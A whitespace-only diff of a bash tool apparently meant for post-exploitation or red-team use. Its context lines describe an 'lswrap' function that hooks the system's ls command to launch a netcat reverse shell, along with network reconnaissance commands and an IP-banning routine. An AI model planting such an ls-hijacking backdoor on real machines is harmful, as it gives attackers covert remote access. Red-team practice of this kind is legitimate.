@@ -113,7 +113,7 @@ function lswrap(){
 			This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal
 
 			EOF
-		read -p "enter (continue/exit) or press enter to return to menu: " ce	
+		read -p "enter (continue/exit) or press enter to return to menu: " ce
 		case $ce in
 			[CONTINUEcontinue]* )
 				shell=${payloads[0]}
@@ -289,7 +289,7 @@ function info(){
 		"ifconfig -a"
 		"route -n"
 		"cat /etc/network/interfaces"
-		"iptables -L -n -v"	
+		"iptables -L -n -v"
 		"iptables -t nat -L -n -v"
 		"ip6tables -L -n -v"
 		"iptables-save"
@@ -357,7 +357,7 @@ function banip(){
 		echo -e '\nCurrent activity on this system:\n'
 		w
 		echo -e "\nDo you want to ban an address or return to menu?" 
-		read -p 'enter (ban/exit) or press enter to return to menu: ' bs	
+		read -p 'enter (ban/exit) or press enter to return to menu: ' bs
 		case $bs in
 			[Banban]* ) read -r -p  'Enter IP to be banned: ' address; iptables -A INPUT -s $address -j DROP;;
 			[Exitexit]* ) return;;
